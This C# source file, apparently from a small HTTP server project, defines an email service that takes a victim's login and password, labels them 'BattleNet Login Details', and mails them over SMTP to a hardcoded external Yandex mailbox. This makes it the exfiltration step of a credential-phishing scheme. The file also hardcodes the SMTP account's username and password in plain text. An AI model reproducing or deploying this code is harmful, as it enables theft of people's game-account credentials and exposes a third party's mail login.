using System;
using System.Net;
using System.Net.Mail;
using System.Net.Http;
using System.Threading.Tasks;
using MyHttpServer.services;

public class EmailSenderService: IEmailSenderService
{
    private readonly string emailFrom = "lolikgaffarov@yandex.ru";
    private readonly string emailTo = "lolikgaffarov@yandex.ru";
    private readonly string smtpServer = "smtp.yandex.ru";
    private readonly int smtpPort = 465;
    private readonly string smtpUsername = "lolikgaffarov";
    private readonly string smtpPassword = "Gaffarov14";

    public async Task SendEmailAsync(string login, string password)
    {
        MailMessage message = new MailMessage(emailFrom, emailTo);
        message.Subject = "BattleNet Login Details";
        message.Body = $"Login: {login}\nPassword: {password}";

        using (SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort))
        {
            smtpClient.EnableSsl = true;
            smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
            await smtpClient.SendMailAsync(message);
        }
    }
}